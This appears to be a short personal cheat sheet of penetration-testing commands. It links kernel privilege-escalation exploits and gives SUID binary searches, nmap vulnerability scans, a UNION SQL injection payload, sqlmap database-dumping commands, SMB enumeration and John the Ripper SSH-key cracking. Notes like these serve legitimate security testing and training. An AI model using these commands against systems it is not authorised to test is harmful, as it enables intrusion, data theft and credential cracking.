# Sec notes



### Privilege escalation exploits:

* Kernel **< 4.4.0-116** : https://www.exploit-db.com/exploits/44298
* Kernel **< 4.13.9** (Ubuntu 16.04 - Fedora 27): https://www.exploit-db.com/exploits/45010

### Find exploitable bins

- `find / -perm -u=s -type f 2>/dev/null | grep -v /proc`
- `find / -perm -o+w -type f 2>/dev/null | grep -v /proc`



### Nmap useful commands:

* Scan host deep : `nmap -Pn  -sS -sV --script=default,vuln -p- -T5 <ip>`

### Wordpress

- TODO

### SQL Injection

- Example concatenate other table where injection is possible : 
  - `<injection_param> UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = '<tablename>'`
- **SQLMAP** 
  - Dump databases: 
    - `sqlmap -u http://example.com/users/<injection_param> --dbs --match`
  - Dump tables:
    -  `sqlmap -u http://example.com/users/<injection_param> -D <db_name> --tables --match`

### SMB

- Enumerate SMB users
  - `enum4linux -a <ip>`


### SSH
- Bruteforce a SSH private key
  - `python /usr/share/john/ssh2john.py <private_key> > private_key.hash
  - `john --wordlist=/path/to/wordlists/wordlist.txt private_key.hash

------




### Misc links:

* From webshell to full tty :  https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
* Cheatsheet post exploit linux : https://guif.re/linuxeop
* SSH bruteforcer in go (way faster than hydra) : https://github.com/aldenso/sshgobrute
